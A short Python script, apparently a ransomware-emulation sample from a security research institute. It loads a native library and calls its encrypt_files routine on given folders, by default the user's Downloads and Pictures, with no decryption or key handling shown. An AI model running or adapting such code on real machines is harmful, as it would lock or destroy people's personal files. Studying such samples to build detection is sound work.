#!/usr/bin/env python

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

# -*- coding: utf-8 -*-
"""Imported DLL module"""

import argparse
import ctypes
import functools
import os
import platform


if platform.system() == "Windows":
    LIB_NAME = "./enc.dll"
else:
    LIB_NAME = "./enc.so"
DLL_OBJ = ctypes.cdll.LoadLibrary(LIB_NAME)

HOME_DIR = os.path.expanduser("~")
JOIN_PARTIAL = functools.partial(os.path.join, HOME_DIR)
DEFAULT_DIRS = list(map(JOIN_PARTIAL, ("Downloads", "Pictures")))


def encrypt_files(dirs_list):
    """encrypt_files."""
    DLL_OBJ.encrypt_files.argtypes = [ctypes.c_char_p]
    DLL_OBJ.encrypt_files.restype = ctypes.c_bool
    results = (DLL_OBJ.encrypt_files(d.encode()) for d in dirs_list)
    return all(results)


def main():
    """main."""
    parser = argparse.ArgumentParser()
    parser.add_argument("directories", nargs="*", default=DEFAULT_DIRS)
    args = parser.parse_args()

    encrypt_files(args.directories)


if __name__ == "__main__":
    main()

